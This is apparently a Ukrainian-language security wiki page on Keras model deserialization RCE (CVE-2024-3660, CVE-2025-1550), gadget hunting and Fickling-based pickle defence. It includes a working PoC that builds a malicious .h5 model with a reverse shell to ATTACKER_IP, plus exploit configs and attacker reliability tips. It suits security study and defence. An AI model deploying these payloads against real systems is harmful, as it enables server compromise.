# RCE під час десеріалізації моделей Keras і Gadget Hunting

{{#include ../banners/hacktricks-training.md}}

На цій сторінці наведено практичні методи експлуатації конвеєра десеріалізації моделей Keras, описано внутрішню структуру нативного формату .keras і його поверхню атаки, а також подано набір інструментів для дослідників, які шукають вразливості у файлах моделей (MFV) і гаджети після виправлень.

## Внутрішня структура формату моделі .keras

Файл .keras — це ZIP-архів, що містить щонайменше:<sup>[[1]](#references)</sup>
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (основна поверхня атаки)
- model.weights.h5 – ваги у форматі HDF5

config.json керує рекурсивною десеріалізацією: Keras імпортує модулі, знаходить класи та функції й відновлює шари й об’єкти з керованих атакувальником словників.<sup>[[1]](#references)</sup>

Приклад фрагмента об’єкта шару Dense:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Десеріалізація виконує:<sup>[[1]](#references)</sup>
- Імпорт модулів і пошук символів за ключами module/class_name
- Виклик from_config(...) або конструктора з контрольованими зловмисником kwargs
- Рекурсивну обробку вкладених об’єктів (активацій, ініціалізаторів, обмежень тощо)

Історично це надавало зловмиснику, який створював config.json, три примітиви:<sup>[[1]](#references)</sup>
- Контроль над тим, які модулі імпортуються
- Контроль над тим, які класи/функції знаходяться
- Контроль над kwargs, що передаються конструкторам/from_config

## CVE-2024-3660 – RCE через байткод Lambda-layer

Першопричина:
- Під час десеріалізації застарілого Lambda Python-функція відновлювалася з маршалізованого коду, контрольованого зловмисником: `func_load()` декодує payload з base64, викликає `marshal.loads()` і створює `FunctionType`. Байткод отриманої функції виконується під час виклику Lambda, а завантажувачі до версії 2.13 не застосовували перевірки safe-mode до застарілих форматів.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

У нативному архіві Keras v3 функція Lambda представлена об’єктом `__lambda__`, поле `code` якого містить маршалізований код у форматі base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Захист:
- Для нативного формату Keras v3 за замовчуванням увімкнено `safe_mode=True`. Серіалізовані лямбда-функції Python у `Lambda` блокуються, якщо користувач явно не вимкне захист за допомогою `safe_mode=False`; на застарілі формати цей захист не поширюється так само.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Примітки:
- Застарілі формати (старіші файли HDF5) або старіші кодові бази можуть не застосовувати сучасні перевірки, тож атаки зі «зниженням версії» все ще можливі, якщо жертви використовують старі завантажувачі.

## CVE-2025-1550 – Імпорт довільних модулів у Keras 3.0.0–3.8.x

Першопричина:
- `_retrieve_class_or_fn` викликав `importlib.import_module(module)` із контрольованими зловмисником рядками модуля з `config.json`.
- Наслідок: спеціально сформований архів `.keras` міг змусити `Model.load_model()` імпортувати вибрані зловмисником модулі та функції Python, спричиняючи побічні ефекти під час імпорту та передаючи контрольовані зловмисником аргументи навіть за ввімкненого `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ідея експлуатації:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Покращення безпеки (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist модулів: імпорт обмежено офіційними модулями екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Безпечний режим за замовчуванням: safe_mode=True блокує небезпечне завантаження серіалізованих функцій Lambda
- Базова перевірка типів: десеріалізовані об’єкти мають відповідати очікуваним типам

## Практична експлуатація: TensorFlow-Keras HDF5 (.h5) Lambda RCE

У застарілих розгортаннях TensorFlow-Keras досі можуть прийматися файли моделей HDF5 (`.h5`). Якщо зловмисник може завантажити модель, яку сервер згодом завантажить або використає для інференсу, вразливий завантажувач може десеріалізувати шар Lambda зі створеним зловмисником кодом Python, який потім може виконатися в робочому процесі моделі застосунку.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Мінімальний PoC для створення шкідливого .h5, у якому Lambda виконує reverse shell, коли ціль запускає модель:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Нотатки та поради щодо надійності:
- Точки запуску залежать від формату та робочого процесу; у згаданому write-up payload виконався двічі під час прогнозування. Вважайте побічні ефекти повторюваними та робіть payloads ідемпотентними.<sup>[[7]](#references)</sup>
- Фіксація версій: використовуйте версії TF/Keras/Python, що відповідають середовищу жертви, аби уникнути невідповідностей серіалізації. Наприклад, створюйте артефакти в Python 3.8 з TensorFlow 2.13.1, якщо саме це використовує цільова система.<sup>[[7]](#references)</sup>
- Швидке відтворення середовища:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Перевірка: безпечне навантаження, наприклад `os.system("ping -c 1 YOUR_IP")`, допомагає підтвердити виконання (наприклад, спостерігаючи за ICMP за допомогою tcpdump), перш ніж перейти до reverse shell.<sup>[[7]](#references)</sup>

## Поверхня gadget-ів після виправлення всередині allowlist

Навіть за наявності allowlist модулів Keras і safe mode дозволені callable-об’єкти можуть спричиняти побічні ефекти. Наприклад, `keras.utils.get_file` завантажує URL і записує його у налаштоване місце кешування, тож його варто розглянути як кандидата для аналізу gadget-ів.<sup>[[1]](#references)[[19]](#references)</sup>

Кандидатна конфігурація Lambda (перевірте сигнатуру виклику в контрольованому тесті):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Важливе обмеження:
- `Lambda.call()` завжди передає вхідні дані моделі як перший позиційний аргумент, а налаштовані `arguments` — як іменовані аргументи. Для `get_file` це позиційне значення заповнює `fname`; невідповідність між тензором і шляхом може призвести до збою цього кандидата ще до будь-якого завантаження, тому це не гарантовано робочий гаджет.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## Дозвіл на імпорт pickle для моделей AI/ML (Fickling)

Багато форматів моделей AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, артефакти joblib/scikit-learn та інші формати на основі Python) містять дані Python pickle. У наведеному вище застарілому шляху Keras Lambda натомість використовується байткод функцій у форматі marshal, тож це окремий ризик десеріалізації. Опкоди pickle можуть виконувати контрольовану зловмисником поведінку під час десеріалізації, зокрема підмінювати модель або призводити до RCE, а прості сканери можуть не виявляти нові чи не внесені до списку небезпечні імпорти.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Практичний захист із принципом fail-closed — перехопити десеріалізатор pickle у Python і дозволити під час розпакування лише перевірений набір нешкідливих імпортів, пов’язаних із ML. Fickling від Trail of Bits реалізує цю політику та містить підготовлений вручну список дозволених імпортів для ML, сформований на основі тисяч відкритих pickle-файлів із Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Модель безпеки для «безпечних» імпортів (узагальнені висновки з досліджень і практики): символи, імпортовані й використані pickle, мають одночасно відповідати таким умовам:<sup>[[8]](#references)</sup>
- Не виконувати код і не спричиняти його виконання (без об’єктів скомпільованого/вихідного коду, запуску команд оболонки, хуків тощо)
- Не отримувати/змінювати довільні атрибути чи елементи
- Не імпортувати й не отримувати посилання на інші об’єкти Python із віртуальної машини pickle
- Не запускати жодних вторинних десеріалізаторів (наприклад, marshal чи вкладений pickle), навіть опосередковано

Увімкніть захист Fickling якомога раніше під час запуску процесу, щоб перевірялися всі завантаження pickle, які виконують фреймворки (`torch.load`, `joblib.load` тощо):<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Операційні поради:
- За потреби можна тимчасово вимкнути/повторно ввімкнути хуки:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Якщо перевірену модель заблоковано, розширте allowlist для свого середовища після перевірки символів:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling також надає універсальні runtime guards, якщо потрібен більш точний контроль:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() для примусового виконання перевірок для всіх pickle.load()
  - with fickling.check_safety(): для обмеженого за областю дії примусового виконання
  - fickling.load(path) / fickling.is_likely_safe(path) для одноразових перевірок

- За можливості віддавайте перевагу форматам моделей, відмінним від pickle (наприклад, SafeTensors).<sup>[[15]](#references)</sup> Якщо потрібно приймати pickle, запускайте завантажувачі з мінімальними привілеями, без вихідного мережевого трафіку та застосовуйте allowlist.

Ця стратегія, що передусім спирається на allowlist, ефективно блокує поширені шляхи експлуатації ML pickle, зберігаючи високу сумісність. У тестуванні ToB Fickling виявив 100% синтетичних шкідливих файлів і дозволив ~99% чистих файлів із провідних репозиторіїв Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Інструментарій дослідника

1) Систематичне виявлення gadget у дозволених модулях

Перелічіть кандидатні викликані об’єкти в keras, keras_nlp, keras_cv, keras_hub і визначте пріоритет тих, що можуть спричинити побічні ефекти з файлами, мережею, процесами чи середовищем.<sup>[[1]](#references)</sup>

<details>
<summary>Перелічити потенційно небезпечні викликані об’єкти в модулях Keras із allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Пряме тестування десеріалізації (архів .keras не потрібен)

Передавайте спеціально сформовані словники безпосередньо десеріалізаторам Keras, щоб з’ясувати, які параметри вони приймають, і спостерігати за побічними ефектами.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Перевірка різних версій і форматів

Keras існує в кількох кодових базах/версіях із різними механізмами захисту та форматами:<sup>[[1]](#references)</sup>
- Вбудований Keras у TensorFlow: tensorflow/python/keras (застарілий, заплановано видалити)
- tf-keras: підтримується окремо
- Keras 3 із підтримкою кількох бекендів (офіційний): представив власний формат .keras

Повторіть тести в різних кодових базах і форматах (.keras і застарілий HDF5), щоб виявити регресії або відсутні механізми захисту.

## References

- [1] [Пошук вразливостей у десеріалізації моделей Keras (блог huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [PR Keras #20751 — додано перевірки до серіалізації](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 — RCE через десеріалізацію Lambda у Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 — довільний імпорт модулів у Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Звіт huntr — довільний імпорт №1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Звіт huntr — довільний імпорт №2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial — RCE через Lambda у TensorFlow .h5 із підвищенням привілеїв до root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Блог Trail of Bits — новий сканер pickle-файлів для AI/ML від Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling — захист середовищ AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Корпус тестів Fickling для сканування pickle-файлів](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Передумови атак Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Проєкт SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 — шари Lambda у Keras 2 допускають довільне впровадження коду](https://kb.cert.org/vuls/id/253266)
- [17] [Вихідний код шару Lambda у Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Вихідний код утиліт Python у Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` у Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
